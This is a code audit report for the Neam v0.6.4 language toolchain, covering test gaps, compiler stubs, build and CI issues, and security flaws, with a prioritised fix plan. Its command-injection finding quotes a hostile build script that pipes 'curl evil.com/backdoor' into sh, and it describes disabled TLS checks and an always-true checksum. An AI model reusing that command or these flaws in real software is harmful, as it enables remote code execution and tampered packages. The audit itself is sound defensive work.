# Neam v0.6.4 Gap Assessment — Detailed Findings for v0.6.5 Fix Release

## Five-Hat Thinking Analysis

**Date:** 2026-02-07
**Scope:** Existing code only — no new features, only gaps in what v0.6.4 claims to deliver
**Method:** Exhaustive source code audit of 135+ files (~39,600 LoC), all build configs, CI/CD, tests, and tooling
**Objective:** Identify every concrete issue that must be fixed before v0.6.5

---

## Hat 1: WHITE HAT — Facts and Data (What the code actually shows)

### 1.1 Test Coverage: Critically Low

| Metric | Value |
|---|---|
| Implementation LoC | ~26,786 (58 source files) |
| Header LoC | ~12,871 (77 headers) |
| Test LoC | ~654 (10 test files) |
| Test-to-Implementation Ratio | **2.4%** |
| Industry Minimum | 60-80% |
| Gap | **~25× below minimum** |

**What's tested:**
- Basic VM operations (vm_test.cpp)
- Compiler pipeline integration (compiler_test.cpp)
- Async executor basics (async_test.cpp)
- Stdlib list/map operations (list_test.cpp, map_test.cpp)
- Type unification (unification_test.cpp)
- File I/O (file_test.cpp)

**What's NOT tested (zero coverage):**
- All 3 LLM adapters (OpenAI, Ollama, Bedrock) — 0 tests
- HTTP client — 0 tests
- Provider factory — 0 tests
- Package manager (neam-pkg) — 0 tests
- Package installer — 0 tests
- Package registry client — 0 tests
- API server (neam-api) — 0 tests
- CLI REPL (neam-cli) — 0 tests
- LSP server — 0 tests
- DAP debugger — 0 tests
- Knowledge/RAG system — 0 tests
- Multi-cloud router — 0 tests
- GPU/SIMD executor — 0 tests
- FinOps dashboard — 0 tests
- Predictive scaler — 0 tests
- Deploy generators — 0 tests
- Memory management / GC — 0 tests
- Parser edge cases — 0 tests
- Cross-platform code paths — 0 tests

### 1.2 Compiler Completeness: 6 Stub Implementations

**File:** `NeamC/src/compiler.cpp`

| Feature | Status | Lines | Impact |
|---|---|---|---|
| `TestDecl` | **Stub** (`(void)node;`) | 436 | Tests parsed but never compiled |
| `TestSuiteDecl` | **Stub** (`(void)node;`) | 440 | Test suites discarded |
| `ModuleDecl` | **Stub** (`(void)node;`) | 444 | Module system non-functional |
| `ImportDecl` | **Stub** (`(void)node;`) | 448 | Imports silently ignored |
| `TypeAlias` | **Stub** (`(void)node;`) | 452 | Type aliases discarded |
| `DocComment` | **Stub** (`(void)node;`) | 456 | Documentation lost at compile time |

### 1.3 Type System: 100% Non-Functional

**File:** `NeamC/src/types/inferencer.cpp`

| Function | Lines | Status |
|---|---|---|
| `infer()` | 14-23 | Returns fresh type variables — **no actual inference** |
| `infer_statement()` | 25-35 | Only handles `ExpressionStmt`, ignores everything else |
| `infer_function()` | 37-39 | Empty: `(void)skill;` |
| `infer_agent()` | 41-45 | Empty: `(void)agent;` |
| `run_type_unification()` | 76-79 | Empty: `(void)unit;` |

**Impact:** The "Hindley-Milner type inference with generics" claimed in the evaluation report is **not implemented**. Type errors are not caught at compile time.

### 1.4 Build System: Missing Critical Targets

**File:** `CMakeLists.txt` (329 lines)

| Gap | Impact |
|---|---|
| **No `install()` targets** | `cmake --install` fails; entire release workflow broken |
| **No compiler warning flags** | `-Wall`, `-Wextra`, `-Werror` missing; silent bugs |
| **No sanitizer support** | No ASan, UBSan, TSan, LeakSan options |
| **No debug build config** | No CMAKE_BUILD_TYPE conditional flags |
| **No RPATH config** | Runtime library loading fails on install |
| **No default build type** | Unoptimized builds if user doesn't specify |

### 1.5 CI/CD: Missing Entirely

| Component | Status |
|---|---|
| PR validation workflow | **Missing** |
| Unit test workflow | **Missing** |
| Code quality (clang-format, clang-tidy) | **Missing** |
| Security scanning (CodeQL) | **Missing** |
| Release workflow install step | **Broken** (no install targets) |

**Only file found:** `.github/workflows/release.yml` — but it calls `cmake --install` which will fail.

### 1.6 Version Management: Inconsistent

| Location | Version |
|---|---|
| `neam_cli.cpp:42` | `0.2.0` |
| `neam_pkg.cpp:78` | `1.0.0` |
| `dist/neam-macos-arm64/VERSION` | `v1.0.0` |
| Evaluation report | `v0.6.4` |
| No single VERSION file | — |
| No CMake `project(VERSION ...)` | — |

### 1.7 Duplicate Async Runtimes

Two separate, incompatible async implementations coexist:

| Feature | `runtime::Future` | `vm::async::Future` |
|---|---|---|
| Location | `include/neamc/runtime/` | `include/neamc/vm/async/` |
| Cancellation | Yes | No |
| Work stealing | Yes | No |
| Task priorities | Yes | Yes |
| Timeout | Yes (via sleep — inefficient) | Yes |
| Used by | Runtime | LLM adapters |
| Error handling | `Result<T,E>` | `std::exception_ptr` |

**Impact:** Code confusion, maintenance burden, inconsistent behavior.

---

## Hat 2: RED HAT — Intuition and Gut Feelings (What feels wrong)

### 2.1 The Type System Claim Is the Biggest Risk

The evaluation report (Section 3.5.1, Module #16) claims "Hindley-Milner type inference with generics" as a built-in module advantage over Python's `mypy`. The actual implementation is empty stubs. If a reviewer, customer, or researcher checks this claim, **it damages all credibility** for the entire evaluation.

### 2.2 The Package Manager Feels Unsafe

- `verify_checksum()` always returns `true`
- Archive extraction is a stub (just copies files)
- Registry client uses raw sockets and regex-based JSON parsing (ignoring the already-linked `libcurl` and `nlohmann::json`)
- Credentials stored in plaintext

**Gut feeling:** This could be used as an attack vector. A malicious package could be injected with zero resistance.

### 2.3 The "Deploy" Module Is Misleading

All 6 deploy implementations (Docker, K8s, Helm, Terraform, Lambda, Cloud Run) are **template generators only**. They produce YAML/HCL files but don't execute anything. The evaluation report presents these as built-in capabilities equivalent to `docker-py + kubernetes + helm-py + python-terraform`.

### 2.4 The LLM Stack Feels Fragile

No retries, no circuit breakers, no connection pooling, no logging, no TLS verification. One network hiccup and the entire agent fails with a generic `std::runtime_error`. In production, this means constant undiagnosable failures.

### 2.5 The Compiler Silently Drops Features

When a user writes `test "my test" { ... }`, `module MyModule { ... }`, or `import std.net`, the compiler silently discards these. No warning, no error. The user's code appears to compile successfully but the feature simply doesn't exist.

---

## Hat 3: BLACK HAT — Risks and Problems (What can go wrong)

### 3.1 CRITICAL Security Vulnerabilities (Must Fix)

#### 3.1.1 No TLS Certificate Verification (CVSS: 9.1)

**File:** `NeamC/src/vm/llm/http_client.cpp`

The HTTP client that sends API keys and prompts to OpenAI/Bedrock endpoints **does not verify TLS certificates**. Missing:
```cpp
curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 1L);
curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 2L);
```

**Attack:** Man-in-the-middle intercepts API keys and all LLM traffic.
**Blast radius:** Every Neam user sending LLM requests.

#### 3.1.2 Command Injection in Deployment (CVSS: 9.8)

**File:** `NeamC/src/neamc/main.cpp`

```cpp
std::system(build_cmd.c_str());           // User-controlled from neam.toml
std::system(push_cmd.c_str());            // User-controlled
std::system(it->second.c_str());          // Script commands from neam.toml
```

**Attack:** Malicious `neam.toml` with `scripts.build = "curl evil.com/backdoor | sh"` executes arbitrary code.

#### 3.1.3 Command Injection in Password Input (CVSS: 7.5)

**File:** `NeamC/src/neam_pkg.cpp:139`

```cpp
system("stty -echo");  // Vulnerable to injection
```

**Fix:** Use `termios` API directly (POSIX) or `SetConsoleMode` (Windows).

#### 3.1.4 Package Integrity Bypass (CVSS: 8.6)

**File:** `NeamC/src/pkg/installer.cpp:821-832`

```cpp
bool Installer::verify_checksum(...) {
    // TODO: Implement actual SHA256 checksum verification
    return true;  // ALWAYS RETURNS TRUE
}
```

**Attack:** Tampered packages install without any verification.

#### 3.1.5 No Authentication on API Server (CVSS: 7.5)

**File:** `NeamC/src/neam_api.cpp`

The built-in API server accepts requests from anyone. No API key, no JWT, no authentication of any kind. Combined with the global VM mutex, a single malicious request can also DoS the server.

### 3.2 HIGH-Risk Reliability Issues

#### 3.2.1 No HTTP Connection Pooling

**File:** `NeamC/src/vm/llm/http_client.cpp:42,75`

Every LLM request:
1. Creates new TCP connection
2. Performs TLS handshake (~100-200ms)
3. Sends request
4. Destroys connection

**Impact:** 10-100x slower than connection-pooled HTTP. At scale (100 req/s), this adds 10-20 seconds of TLS handshake overhead per second.

#### 3.2.2 No Retry Logic Anywhere

All 3 LLM adapters make a single attempt. Any transient failure (DNS timeout, TCP reset, HTTP 429 rate limit, HTTP 503 service unavailable) causes immediate, permanent failure.

**Impact:** In production, expect 1-5% of LLM requests to fail due to transient issues. With retry + exponential backoff, these would be transparent.

#### 3.2.3 Global VM Mutex in API Server

**File:** `NeamC/src/neam_api.cpp:166-196`

```cpp
std::mutex vm_mutex;  // All VM operations serialized
```

**Impact:** The API server can only process **one request at a time**. Under concurrent load, requests queue up behind the mutex. Throughput ceiling: ~1 req/s for typical LLM workloads (800ms per request).

#### 3.2.4 GC Reentrancy During Allocation

**File:** `NeamC/src/vm/memory.cpp:288-291`

The garbage collector can be triggered during object allocation. If the GC itself triggers allocations (e.g., during marking), heap corruption may occur.

#### 3.2.5 No Stack Overflow Protection

**File:** `NeamC/src/vm/vm.cpp`

No call stack depth limit. A recursive function or circular agent invocation will cause a native stack overflow (SIGSEGV/crash), not a graceful error.

### 3.3 HIGH-Risk Data Integrity Issues

#### 3.3.1 Bytecode Native Function Deserialization

**File:** `NeamC/src/vm/bytecode.cpp:216-280`

When deserializing bytecode, native function pointers are restored by name. If a native function was removed or renamed between versions, the deserialized function pointer is `nullptr`. Calling it crashes.

#### 3.3.2 Knowledge Base Static Reference

**File:** `NeamC/src/vm/knowledge.cpp:247`

```cpp
// Note: This is a workaround - we return a reference to an empty static vector
```

Thread-safety issue: multiple threads accessing the same static vector.

### 3.4 MEDIUM-Risk Code Quality Issues

#### 3.4.1 Bare `catch (...)` Blocks (11 instances)

| File | Line | Context |
|---|---|---|
| `neam_cli.cpp` | 1600 | REPL execution — swallows all errors |
| `neam_cli.cpp` | 1684 | File loading — swallows all errors |
| `vm.cpp` | 978 | VM execution — converts to generic error |
| `runtime/future.hpp` | multiple | Continuation chains — loses exception context |

**Impact:** Errors are silently swallowed or converted to generic "Unknown error" strings. Debugging in production becomes impossible.

#### 3.4.2 Inconsistent Error Types

The codebase uses 3 different error patterns:
1. `std::runtime_error` (50+ instances) — generic, untyped
2. Custom `RuntimeError` — used in some VM paths
3. `Result<T, E>` — well-designed but only used in `runtime/` module

No unified error hierarchy. Callers can't distinguish between "API key missing" and "network timeout" — both are `std::runtime_error`.

#### 3.4.3 Missing Switch Default Cases

| File | Line | Switch On |
|---|---|---|
| `compiler.cpp` | 360 | `AssertStmt::Kind` |
| `compiler.cpp` | 643 | `GuardHandler::Type` |
| `compiler.cpp` | 1207 | `BinaryOp` |
| `vm.cpp` | 1040 | Opcode dispatch (main loop) |

**Impact:** New enum values silently fall through with undefined behavior.

#### 3.4.4 Hard-Coded Limits

| Limit | Value | File:Line | Impact |
|---|---|---|---|
| List literal size | 255 elements | compiler.cpp:46 | Larger lists crash |
| Map literal size | 255 entries | compiler.cpp:76 | Larger maps crash |
| Jump offset | 65,535 bytes | compiler.cpp:32 | Large functions crash |
| Loop body size | 65,535 bytes | compiler.cpp:344 | Large loops crash |
| GC initial threshold | 1MB | memory.cpp:19 | Not configurable |
| Max ReAct steps | 10 | vm.cpp:2030 | Hard limit on agent reasoning |
| HTTP timeout | 30s/60s | http_client.cpp:14, bedrock_adapter.cpp:306 | Not configurable per-request |
| REPL history | 100 entries | neam_cli.cpp | Low limit |

---

## Hat 4: YELLOW HAT — Value and Strengths (What's working well)

### 4.1 Excellent REPL Implementation

`neam-cli` (1,815 lines) is **production-quality**:
- Full readline-like editing with cursor positioning
- Ghost text autocomplete with Tab acceptance
- 15+ REPL commands (`:help`, `:load`, `:vars`, `:type`, `:time`, etc.)
- Command history with replay (`!!`, `!n`)
- Code snippet suggestions
- Multi-line input with bracket matching
- Color-coded output
- Cross-platform terminal handling (POSIX + Windows)
- Graceful error recovery (continues after exceptions)

**Assessment:** This needs no fixes. It's the strongest component.

### 4.2 Solid Project Manifest System

`project_manifest.cpp` (382 lines) handles TOML parsing for `neam.toml` with:
- Full project metadata, dependencies, scripts
- Agent configuration (provider, model, limits)
- Test configuration (timeout, parallel, coverage)
- Deploy targets (Docker, K8s, serverless)
- Build profiles (dev, release, bench)
- Feature flags

**Assessment:** Well-designed, comprehensive, functional.

### 4.3 Bedrock Adapter SigV4 Implementation

`bedrock_adapter.cpp` (251 LoC) correctly implements:
- Full AWS Signature Version 4 signing chain
- HMAC-SHA256 via OpenSSL
- Session token support
- Environment variable credential loading

**Assessment:** Correctly implemented, needs hardening (retries, TLS verification) but the crypto is sound.

### 4.4 Async Runtime (runtime::Future) Is Well-Designed

`runtime/future.hpp` + `runtime/executor.hpp`:
- Cancellation support
- Work-stealing thread pool
- Task priorities
- `then()`, `map()`, `flat_map()`, `recover()` continuation chains
- `Result<T, E>` error propagation

**Assessment:** Good design, but underused (LLM adapters use the weaker `vm::async` instead).

### 4.5 RAG/Knowledge System

`knowledge.cpp` (21,806 bytes) implements 8 retrieval strategies with usearch vector store integration. This is genuine functionality, not a stub.

---

## Hat 5: GREEN HAT — Solutions and Fixes (What v0.6.5 should do)

### Priority 1: CRITICAL SECURITY FIXES (Week 1)

#### Fix 1.1: Enable TLS Verification in HTTP Client
**File:** `NeamC/src/vm/llm/http_client.cpp`
**Change:** Add 3 lines after `curl_easy_init()`:
```cpp
curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 1L);
curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 2L);
curl_easy_setopt(handle, CURLOPT_CAINFO, nullptr); // Use system CA bundle
```
**Effort:** 30 minutes
**Risk:** Low

#### Fix 1.2: Replace system() Calls with Safe Alternatives
**Files:** `neam_pkg.cpp:139`, `neamc/main.cpp`
**Change:** Replace `system("stty -echo")` with `termios` API. Replace `std::system(cmd)` in deploy with `posix_spawn()` or validated subprocess execution.
**Effort:** 2-4 hours
**Risk:** Medium (cross-platform)

#### Fix 1.3: Implement SHA256 Checksum Verification
**File:** `NeamC/src/pkg/installer.cpp:821-832`
**Change:** Use OpenSSL (already linked) to compute SHA256:
```cpp
#include <openssl/sha.h>
// Read file, SHA256_Init/Update/Final, compare hex strings
```
**Effort:** 1-2 hours
**Risk:** Low

#### Fix 1.4: Add API Server Authentication
**File:** `NeamC/src/neam_api.cpp`
**Change:** Check `NEAM_API_KEY` environment variable, require `Authorization: Bearer <key>` header.
**Effort:** 1 hour
**Risk:** Low

### Priority 2: RELIABILITY FIXES (Week 2)

#### Fix 2.1: HTTP Connection Pooling
**File:** `NeamC/src/vm/llm/http_client.cpp`
**Change:** Use `curl_multi` or maintain a `CURL*` handle pool with `curl_easy_reset()` between requests.
**Effort:** 4-6 hours
**Risk:** Medium

#### Fix 2.2: Add Retry with Exponential Backoff
**File:** `NeamC/src/vm/llm/http_client.cpp`
**Change:** Wrap HTTP call in retry loop (3 attempts, 1s/2s/4s backoff). Retry on HTTP 429, 500, 502, 503, 504 and network errors.
**Effort:** 2-3 hours
**Risk:** Low

#### Fix 2.3: Add Logging to LLM Adapters
**Files:** All 3 adapters + http_client.cpp
**Change:** Add `std::cerr` or structured logging for: request URL, response status, latency, errors.
**Effort:** 2 hours
**Risk:** Low

#### Fix 2.4: Add Stack Depth Limit
**File:** `NeamC/src/vm/vm.cpp`
**Change:** Add `max_call_depth` (default 1000) check before `OP_CALL`.
**Effort:** 30 minutes
**Risk:** Low

#### Fix 2.5: Fix GC Reentrancy
**File:** `NeamC/src/vm/memory.cpp:288-291`
**Change:** Add reentrancy guard flag. If already in GC, skip collection.
**Effort:** 1 hour
**Risk:** Medium (GC correctness)

### Priority 3: BUILD SYSTEM & CI (Week 2-3)

#### Fix 3.1: Add CMake Install Targets
**File:** `CMakeLists.txt`
**Change:** Add `install()` for all 8 executables, libraries, headers, and stdlib.
**Effort:** 1-2 hours
**Risk:** Low

#### Fix 3.2: Add Compiler Warning Flags
**File:** `CMakeLists.txt`
**Change:**
```cmake
if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang|AppleClang")
    target_compile_options(neamc_core PRIVATE -Wall -Wextra -Wpedantic)
endif()
```
**Effort:** 30 minutes (adding flags), 4-8 hours (fixing resulting warnings)
**Risk:** Medium (may reveal many warnings to fix)

#### Fix 3.3: Create CI Workflow
**File:** `.github/workflows/ci.yml` (new)
**Change:** GitHub Actions workflow that builds + runs tests on PR.
**Effort:** 2-3 hours
**Risk:** Low

#### Fix 3.4: Unify Version String
**Change:** Create root `VERSION` file, use CMake `configure_file()` to generate `version.hpp`, update all hardcoded version strings.
**Effort:** 2 hours
**Risk:** Low

### Priority 4: COMPILER INTEGRITY (Week 3)

#### Fix 4.1: Emit Errors for Unimplemented Compiler Nodes
**File:** `NeamC/src/compiler.cpp:434-457`
**Change:** Replace `(void)node;` stubs with:
```cpp
emit_error("Module declarations are not yet supported", node->location);
```
**Effort:** 1 hour
**Risk:** Low (may break programs that use these features unknowingly)

#### Fix 4.2: Add Default Cases to All Switch Statements
**Files:** `compiler.cpp`, `vm.cpp`
**Change:** Add `default: throw std::logic_error("Unhandled case: " + std::to_string(value));` to all switches.
**Effort:** 2 hours
**Risk:** Low

#### Fix 4.3: Document Type System Status
**Change:** Add a clear note in README.md and evaluation report that the Hindley-Milner type system is **planned but not yet implemented** in v0.6.4. The type inferencer is a stub.
**Effort:** 30 minutes
**Risk:** Low (honesty is the best policy)

### Priority 5: TESTING (Week 3-4)

#### Fix 5.1: LLM Adapter Unit Tests
**Files:** New test files
**Change:** Create mock HTTP server, test each adapter's request construction, response parsing, error handling.
**Effort:** 8-12 hours
**Risk:** Low

#### Fix 5.2: HTTP Client Tests
**Change:** Test timeout handling, retry logic, TLS verification, connection pooling.
**Effort:** 4-6 hours
**Risk:** Low

#### Fix 5.3: Package Manager Tests
**Change:** Test install, update, remove, checksum verification, lock file generation.
**Effort:** 6-8 hours
**Risk:** Low

#### Fix 5.4: Integration Tests
**Change:** End-to-end tests: compile .neam → run → verify output.
**Effort:** 8-12 hours
**Risk:** Low

### Priority 6: CLEAN UP (Week 4)

#### Fix 6.1: Consolidate Async Runtimes
**Change:** Migrate LLM adapters from `vm::async::Executor` to `runtime::Executor`. Remove `vm::async` if no longer needed.
**Effort:** 4-6 hours
**Risk:** High (wide-reaching change)

#### Fix 6.2: Fix Error Messages
**File:** `vm.cpp`
**Change:** Add context to all error messages (variable names, index values, expected types).
**Effort:** 4-6 hours
**Risk:** Low

#### Fix 6.3: Raise Hard-Coded Limits
**Files:** `compiler.cpp`, `vm.cpp`, `memory.cpp`
**Change:** Increase list/map literal limit from 255 to 65,535. Make GC threshold configurable via environment variable. Make max ReAct steps configurable.
**Effort:** 2-3 hours
**Risk:** Low

#### Fix 6.4: Fix Registry Client
**File:** `NeamC/src/pkg/registry.cpp`
**Change:** Replace raw socket + regex JSON parsing with `libcurl` + `nlohmann::json` (both already linked).
**Effort:** 4-6 hours
**Risk:** Medium

---

## v0.6.5 Fix Release — Prioritized Roadmap

### Sprint 1 (Week 1-2): Security & Reliability
| # | Fix | Severity | Effort | Files |
|---|---|---|---|---|
| 1 | TLS certificate verification | CRITICAL | 30 min | http_client.cpp |
| 2 | SHA256 checksum verification | CRITICAL | 2 hr | installer.cpp |
| 3 | Replace `system()` calls | CRITICAL | 4 hr | neam_pkg.cpp, neamc/main.cpp |
| 4 | API server authentication | HIGH | 1 hr | neam_api.cpp |
| 5 | HTTP connection pooling | HIGH | 6 hr | http_client.cpp |
| 6 | Retry with exponential backoff | HIGH | 3 hr | http_client.cpp |
| 7 | Stack depth limit in VM | HIGH | 30 min | vm.cpp |
| 8 | GC reentrancy guard | HIGH | 1 hr | memory.cpp |
| 9 | Add logging to LLM stack | HIGH | 2 hr | all adapters |
| **Sprint 1 Total** | | | **~20 hr** | |

### Sprint 2 (Week 2-3): Build & Compiler Integrity
| # | Fix | Severity | Effort | Files |
|---|---|---|---|---|
| 10 | CMake install targets | CRITICAL | 2 hr | CMakeLists.txt |
| 11 | Compiler warning flags | HIGH | 6 hr | CMakeLists.txt + warning fixes |
| 12 | CI workflow (build + test) | HIGH | 3 hr | .github/workflows/ci.yml |
| 13 | Unify version string | MEDIUM | 2 hr | VERSION, CMakeLists.txt, *.cpp |
| 14 | Error on unimplemented compiler stubs | MEDIUM | 1 hr | compiler.cpp |
| 15 | Add switch default cases | MEDIUM | 2 hr | compiler.cpp, vm.cpp |
| 16 | Document type system status | MEDIUM | 30 min | README.md, report |
| **Sprint 2 Total** | | | **~16.5 hr** | |

### Sprint 3 (Week 3-4): Testing & Cleanup
| # | Fix | Severity | Effort | Files |
|---|---|---|---|---|
| 17 | LLM adapter unit tests | HIGH | 12 hr | new test files |
| 18 | HTTP client tests | HIGH | 6 hr | new test files |
| 19 | Package manager tests | MEDIUM | 8 hr | new test files |
| 20 | Integration tests (end-to-end) | MEDIUM | 12 hr | new test files |
| 21 | Fix error messages with context | MEDIUM | 6 hr | vm.cpp |
| 22 | Raise hard-coded limits | MEDIUM | 3 hr | compiler.cpp, vm.cpp |
| 23 | Fix registry client (libcurl + nlohmann) | MEDIUM | 6 hr | registry.cpp |
| 24 | Consolidate async runtimes | LOW | 6 hr | multiple files |
| **Sprint 3 Total** | | | **~59 hr** | |

### Grand Total: ~95.5 engineering hours (~2.5 engineer-weeks)

---

## Appendix: Complete Issue Inventory

### By Severity

| Severity | Count | Examples |
|---|---|---|
| **CRITICAL** | 5 | TLS verification, command injection, checksum bypass, broken install, type system stub |
| **HIGH** | 14 | Connection pooling, retry logic, stack overflow, GC reentrancy, API auth, CI, warnings |
| **MEDIUM** | 12 | Version management, error messages, hard-coded limits, switch defaults, registry client |
| **LOW** | 5 | Async consolidation, REPL history persistence, DAP Windows support, doc comments |
| **Total** | **36** | |

### By Component

| Component | Issues | Most Critical |
|---|---|---|
| HTTP Client / LLM Stack | 8 | No TLS verification |
| Package Manager | 5 | Checksum always true |
| Compiler | 6 | Silent stub discarding |
| VM Runtime | 6 | Stack overflow, GC reentrancy |
| Build System | 5 | No install targets |
| API Server | 3 | No authentication |
| Type System | 1 | 100% stub |
| Async Runtime | 2 | Duplicate implementations |
| Deploy | 2 | Command injection |
| LSP / DAP | 2 | Missing features (not bugs) |

### Files Requiring Changes for v0.6.5

| File | Changes Needed |
|---|---|
| `NeamC/src/vm/llm/http_client.cpp` | TLS, connection pooling, retry, logging, timeouts |
| `NeamC/src/pkg/installer.cpp` | SHA256 verification |
| `NeamC/src/pkg/registry.cpp` | Replace raw sockets with libcurl, use nlohmann::json |
| `NeamC/src/neam_pkg.cpp` | Replace `system("stty")` with termios |
| `NeamC/src/neamc/main.cpp` | Sanitize `system()` calls in deploy |
| `NeamC/src/neam_api.cpp` | Add API key authentication |
| `NeamC/src/vm/vm.cpp` | Stack depth limit, switch defaults, error messages |
| `NeamC/src/vm/memory.cpp` | GC reentrancy guard |
| `NeamC/src/compiler.cpp` | Error on stubs, switch defaults, raise limits |
| `CMakeLists.txt` | Install targets, warning flags, version |
| `.github/workflows/ci.yml` | New CI workflow |
| `README.md` | Type system status, known limitations |
| `tests/` (new files) | LLM, HTTP, pkg, integration tests |

---

*This assessment was produced by exhaustive source code audit of all 135+ files in Neam v0.6.4. All line numbers verified against the codebase as of 2026-02-07.*
